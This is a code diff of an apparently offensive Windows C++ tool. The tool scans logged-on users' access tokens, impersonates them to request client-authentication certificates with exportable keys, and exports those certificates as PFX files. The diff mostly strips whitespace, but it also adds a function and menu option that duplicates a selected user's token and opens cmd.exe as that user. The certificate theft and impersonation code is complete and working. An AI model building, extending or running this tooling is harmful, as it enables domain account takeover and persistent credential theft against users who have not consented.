@@ -159,7 +159,7 @@ std::wstring StringToWString(const std::string& str) {
 // --- Get Domain Name ---
 std::string GetUserDnsDomain() {
     std::string result = "";
-    std::array<char, 256> buffer; 
+    std::array<char, 256> buffer;
 
     std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen("set USERDNSDOMAIN", "r"), _pclose);
     if (!pipe) {
@@ -186,7 +186,7 @@ std::string GetUserDnsDomain() {
         }
     }
     wprintf(L"[!] GetUserDnsDomain: Could not parse domain from 'set USERDNSDOMAIN' output.\n");
-    return ""; 
+    return "";
 }
 
 
@@ -224,23 +224,23 @@ std::string generateINF(const std::string& username, const std::string& domain, 
         "Signature=\"$Windows NT$\"\n\n"
         "[NewRequest]\n"
         "Subject = \"" << subject << "\"\n"
-        "KeySpec = 1\n"                  
+        "KeySpec = 1\n"
         "KeyLength = 2048\n"
-        "Exportable = TRUE\n"            
-        "MachineKeySet = FALSE\n"        
-        "ProviderName = \"Microsoft Enhanced Cryptographic Provider v1.0\"\n" 
-        "ProviderType = 1\n"            
-        "RequestType = PKCS10\n"         
-        "KeyUsage = 0xa0\n\n"            
+        "Exportable = TRUE\n"
+        "MachineKeySet = FALSE\n"
+        "ProviderName = \"Microsoft Enhanced Cryptographic Provider v1.0\"\n"
+        "ProviderType = 1\n"
+        "RequestType = PKCS10\n"
+        "KeyUsage = 0xa0\n\n"
         "[EnhancedKeyUsageExtension]\n"
-        "OID=1.3.6.1.5.5.7.3.2\n\n"      
+        "OID=1.3.6.1.5.5.7.3.2\n\n"
         "[Extensions]\n"
-        "2.5.29.17 = \"{text}\"\n"        
-        "_continue_ = \"dns=" << domain << "&upn=" << upn << "\"\n"; 
+        "2.5.29.17 = \"{text}\"\n"
+        "_continue_ = \"dns=" << domain << "&upn=" << upn << "\"\n";
 
     infFile.close();
     wprintf(L"[*] generateINF: Successfully generated INF file: %S\n", infFilePath.c_str());
-    return infFilePath; 
+    return infFilePath;
 }
 
 //  Certificate  Functions Command 
@@ -263,7 +263,7 @@ std::string readThumbprintFromFile() {
     std::getline(file, thumbprint);
     file.close();
 
-    return trim(thumbprint); 
+    return trim(thumbprint);
 }
 
 
@@ -290,9 +290,9 @@ typedef struct {
     HANDLE TokenHandle;
     int DisplayId;
     DWORD SessionId;
-    wchar_t Username[FULL_NAME_LENGTH];     
-    wchar_t UsernameOnly[MAX_USERNAME_LENGTH]; 
-    wchar_t DomainName[MAX_DOMAINNAME_LENGTH];   
+    wchar_t Username[FULL_NAME_LENGTH];
+    wchar_t UsernameOnly[MAX_USERNAME_LENGTH];
+    wchar_t DomainName[MAX_DOMAINNAME_LENGTH];
     wchar_t TokenType[TOKEN_TYPE_LENGTH];
     wchar_t TokenImpersonationLevel[TOKEN_IMPERSONATION_LENGTH];
     wchar_t TokenIntegrity[TOKEN_INTEGRITY_LENGTH];
@@ -304,7 +304,7 @@ typedef struct {
 std::vector<TOKEN> g_discoveredTokens;
 DWORD g_currentProcessIntegrity = SECURITY_MANDATORY_UNTRUSTED_RID;
 DWORD g_currentSessionId = (DWORD)-1;
-std::string g_userDnsDomain = ""; 
+std::string g_userDnsDomain = "";
 
 
 // --- Forward Declarations ---
@@ -360,7 +360,7 @@ bool EnablePrivilege(LPCWSTR privilegeName) {
     if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
         DWORD lastError = GetLastError();
         if (lastError == ERROR_NOT_ALL_ASSIGNED) {
- 
+
         }
         else {
             wprintf(L"[!] EnablePrivilege: AdjustTokenPrivileges failed for %ls. Error: %lu\n", privilegeName, lastError);
@@ -383,19 +383,19 @@ bool EnablePrivilege(LPCWSTR privilegeName) {
         return false;
     }
 
-    CloseHandle(hToken); 
+    CloseHandle(hToken);
 
     for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; ++i) {
         if (pTokenPrivileges->Privileges[i].Luid.LowPart == luid.LowPart &&
             pTokenPrivileges->Privileges[i].Luid.HighPart == luid.HighPart) {
             if ((pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
-                return true; 
+                return true;
             }
         }
     }
 
     /*wprintf(L"[*] EnablePrivilege: Failed to enable %ls (Privilege not held or AdjustTokenPrivileges failed silently).\n", privilegeName);*/
-    return false; 
+    return false;
 }
 
 
@@ -812,11 +812,11 @@ bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalComma
     if (wcscmp(fileName, L"certreq.exe") == 0 || wcscmp(fileName, L"powershell.exe") == 0) {
         useCmd = true;
 
-        commandToExecute = L"cmd /c \"" + originalCommandLine + L"\""; 
+        commandToExecute = L"cmd /c \"" + originalCommandLine + L"\"";
         wprintf(L"\t[*] Using 'cmd /c' wrapper.\n");
     }
     else {
-        executablePath = L""; 
+        executablePath = L"";
         commandToExecute = originalCommandLine;
     }
 
@@ -855,12 +855,12 @@ bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalComma
 
     /*wprintf(L"\t[*] Trying CreateProcessAsUserW...\n");*/
     if (CreateProcessAsUserW(hPrimaryToken,
-        NULL, 
+        NULL,
         mutableCommandLine,
         NULL, NULL, FALSE,
-        CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, 
+        CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
         NULL,
-        currentDir.c_str(), 
+        currentDir.c_str(),
         &si, &pi))
     {
         wprintf(L"\t[*] CreateProcessAsUserW succeeded. PID: %lu\n", pi.dwProcessId);
@@ -874,11 +874,11 @@ bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalComma
             wprintf(L"\t[*] Trying CreateProcessWithTokenW as fallback...\n");
             if (CreateProcessWithTokenW(hPrimaryToken,
                 LOGON_WITH_PROFILE,
-                NULL, 
-                mutableCommandLine,
-                CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, 
                 NULL,
-                currentDir.c_str(), 
+                mutableCommandLine,
+                CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
+                NULL,
+                currentDir.c_str(),
                 &si, &pi))
             {
                 /*wprintf(L"\t[*] CreateProcessWithTokenW succeeded. PID: %lu\n", pi.dwProcessId);*/
@@ -894,7 +894,7 @@ bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalComma
     if (success) {
         /*wprintf(L"\t[*] Waiting for command to complete...\n");*/
         WaitForSingleObject(pi.hProcess, INFINITE);
-       /* wprintf(L"\t[*] Command completed.\n");*/
+        /* wprintf(L"\t[*] Command completed.\n");*/
 
         DWORD exitCode = 0;
         if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
@@ -914,7 +914,7 @@ bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalComma
 
     CloseHandle(hPrimaryToken);
 
-    return success; 
+    return success;
 }
 
 
@@ -958,7 +958,7 @@ void RequestCertificateForToken(int tokenId) {
         return;
     }
     wprintf(L"[*]   Username: %S\n", username.c_str());
-    wprintf(L"[*]   Domain: %S\n", g_userDnsDomain.c_str()); 
+    wprintf(L"[*]   Domain: %S\n", g_userDnsDomain.c_str());
 
 
     // Define unique file paths for this user
@@ -972,7 +972,7 @@ void RequestCertificateForToken(int tokenId) {
     std::wstring wcerFilePath = StringToWString(cerFilePath);
     std::wstring wThumbprintFilePath = StringToWString(THUMBPRINT_FILENAME); // Path for the temp thumbprint file
 
-    bool stepSuccess = true; 
+    bool stepSuccess = true;
 
     // 2. Generate INF File
     /*wprintf(L"[*]   Generating INF file: %S\n", infFilePath.c_str());*/
@@ -1012,7 +1012,7 @@ void RequestCertificateForToken(int tokenId) {
         }
     }
 
- 
+
     if (stepSuccess) {
         std::this_thread::sleep_for(std::chrono::seconds(2));
     }
@@ -1027,7 +1027,7 @@ void RequestCertificateForToken(int tokenId) {
             stepSuccess = false;
         }
         else {
-    
+
             thumbprint = readThumbprintFromFile();
             if (thumbprint.empty()) {
                 wprintf(L"[!] Error: Failed to read thumbprint from file for %S. Cannot export PFX.\n", username.c_str());
@@ -1040,13 +1040,13 @@ void RequestCertificateForToken(int tokenId) {
     }
 
     // 7. Export PFX 
-    if (stepSuccess) { 
+    if (stepSuccess) {
         wprintf(L"[*]   Exporting certificate to PFX...\n");
         std::wstring cmdExport = exportPFXCommand(thumbprint, username);
         if (!RunCommandAsToken(*pSelectedToken, cmdExport)) {
             wprintf(L"[!] Error: PowerShell command to export PFX failed for %S.\n", username.c_str());
 
-            stepSuccess = false; 
+            stepSuccess = false;
         }
         else {
             wprintf(L"[+] Successfully requested certificate and exported PFX for user %S. PFX potentially at: %S\n", username.c_str(), pfxFilePath.c_str());
@@ -1068,6 +1068,39 @@ void RequestCertificateForToken(int tokenId) {
     /*wprintf(L"--- Finished processing Token ID: %d ---\n", tokenId);*/
 }
 
+void OpenCmdAsToken(const TOKEN& tokenInfo) {
+    wprintf(L"\n--- Attempting to Open CMD for Token ID: %d ---\n", tokenInfo.DisplayId);
+    wprintf(L"[*]   Using Token for User: %s (Session: %lu, Integrity: %ls)\n", tokenInfo.Username, tokenInfo.SessionId, tokenInfo.TokenIntegrity);
+
+    HANDLE hPrimaryToken = NULL; PROCESS_INFORMATION pi = { 0 }; STARTUPINFOW si = { sizeof(si) };
+    si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default"); // Make it interactive
+    bool processCreated = false; DWORD lastError = 0;
+
+    // 1. Duplicate Token
+    if (!DuplicateTokenEx(tokenInfo.TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) { wprintf(L"[!] DuplicateTokenEx failed. Error: %lu\n", GetLastError()); return; }
+    /*wprintf(L"[*]   Successfully duplicated token...\n");*/
+
+    // 2. Set Session ID (Best effort)
+    DWORD targetSessionId = (g_currentSessionId != (DWORD)-1) ? g_currentSessionId : tokenInfo.SessionId; if (targetSessionId != (DWORD)-1) { SetTokenInformation(hPrimaryToken, TokenSessionId, &targetSessionId, sizeof(DWORD)); }
+
+    // 3. Prepare Command Line & Directory
+    wchar_t mutableCommandLine[COMMAND_LENGTH]; wcscpy_s(mutableCommandLine, COMMAND_LENGTH, L"C:\\Windows\\System32\\cmd.exe"); std::wstring currentDir = StringToWString(PUBLIC_PATH);
+
+    // 4. Create Process (Try AsUser first)
+    /*wprintf(L"[*]   Trying CreateProcessAsUserW...\n");*/
+    if (CreateProcessAsUserW(hPrimaryToken, NULL, mutableCommandLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir.c_str(), &si, &pi))
+    {
+        wprintf(L"[*]   CreateProcessAsUserW succeeded. CMD launched (PID: %lu)\n", pi.dwProcessId); processCreated = true;
+    }
+    else { lastError = GetLastError(); /*wprintf(L"[!]   CreateProcessAsUserW failed. Error: %lu\n", lastError);*/ if (lastError == 1314) { /*wprintf(L"[*]   Trying CreateProcessWithTokenW as fallback...\n");*/ if (CreateProcessWithTokenW(hPrimaryToken, LOGON_WITH_PROFILE, NULL, mutableCommandLine, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir.c_str(), &si, &pi)) { wprintf(L"[*]   CreateProcessWithTokenW succeeded. CMD launched (PID: %lu)\n", pi.dwProcessId); processCreated = true; } else { lastError = GetLastError(); wprintf(L"[!]   CreateProcessWithTokenW also failed. Error: %lu\n", lastError); } } else { /* Failed for other reason */ } }
+
+    // 5. Cleanup handles (Important: Close process/thread handles for the launched CMD)
+    if (processCreated) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
+    CloseHandle(hPrimaryToken);
+
+    if (!processCreated) { wprintf(L"[-] Failed to launch CMD for Token ID %d.\n", tokenInfo.DisplayId); }
+    wprintf(L"--- Finished CMD launch attempt for Token ID: %d ---\n", tokenInfo.DisplayId);
+}
 
 // --- Main Entry Point ---
 int wmain(int argc, wchar_t* argv[]) {
@@ -1091,9 +1124,9 @@ int wmain(int argc, wchar_t* argv[]) {
     wprintf(L"[*] Attempting to adjust Desktop/WindowStation ACLs...\n");
 
     if (!ACL_Change::AdjustDesktop()) {
-        
+
         wprintf(L"[!] Failed to adjust desktop ACLs (Error: %S). CreateProcessAsUser may fail interaction.\n", ACL_Change::GetLastErrorAsString().c_str());
-        
+
     }
     else {
         wprintf(L"[*] Successfully adjusted desktop ACLs (or already correct).\n");
@@ -1107,7 +1140,8 @@ int wmain(int argc, wchar_t* argv[]) {
         std::wcout << L"\n--- Menu ---" << std::endl;
         std::wcout << L"1. Scan and Display Interactive User Tokens" << std::endl;
         std::wcout << L"2. Request Certificate for Selected Token ID" << std::endl;
-        std::wcout << L"3. Exit" << std::endl;
+        std::wcout << L"3. Open cmd.exe" << std::endl;
+        std::wcout << L"4. Exit" << std::endl;
         std::wcout << L"Enter your choice: ";
 
         // Get Input
@@ -1117,18 +1151,18 @@ int wmain(int argc, wchar_t* argv[]) {
         if (std::wcin.fail()) {
             std::wcout << L"[!] Invalid input. Please enter a number." << std::endl;
             ClearInputBuffer();
-            choice = 0; 
-            continue; 
+            choice = 0;
+            continue;
         }
-        ClearInputBuffer(); 
+        ClearInputBuffer();
 
 
         std::this_thread::sleep_for(std::chrono::seconds(5));
 
         // Process Choice
         switch (choice) {
-        case 1: 
-            CleanupTokenHandles(); 
+        case 1:
+            CleanupTokenHandles();
             if (DiscoverAndStoreTokens()) {
                 DisplayTokenList();
             }
@@ -1151,13 +1185,27 @@ int wmain(int argc, wchar_t* argv[]) {
                     ClearInputBuffer();
                 }
                 else {
-                    ClearInputBuffer(); 
-                    RequestCertificateForToken(selectedId); 
+                    ClearInputBuffer();
+                    RequestCertificateForToken(selectedId);
+                }
+            }
+            break;
+        case 3:
+            if (g_discoveredTokens.empty()) { std::wcout << L"[!] No tokens discovered..." << std::endl; }
+            else {
+                int selectedId = 0; std::wcout << L"\n[*] Enter Token ID to open CMD with: "; std::wcin >> selectedId; if (std::wcin.fail()) { std::wcout << L"[!] Invalid ID." << std::endl; ClearInputBuffer(); }
+                else {
+                    ClearInputBuffer();
+                    // Find token (similar logic to RequestCertificateForToken)
+                    const TOKEN* pSelectedTokenCmd = nullptr;
+                    for (const auto& token : g_discoveredTokens) { if (token.DisplayId == selectedId) { pSelectedTokenCmd = &token; break; } }
+                    if (pSelectedTokenCmd == nullptr) { wprintf(L"[!] Error: Token ID %d not found.\n", selectedId); }
+                    else { OpenCmdAsToken(*pSelectedTokenCmd); } // Call the new function
                 }
             }
             break;
 
-        case 3: // Exit
+        case 4: // Exit
             std::wcout << L"[*] Exiting..." << std::endl;
             break;
 
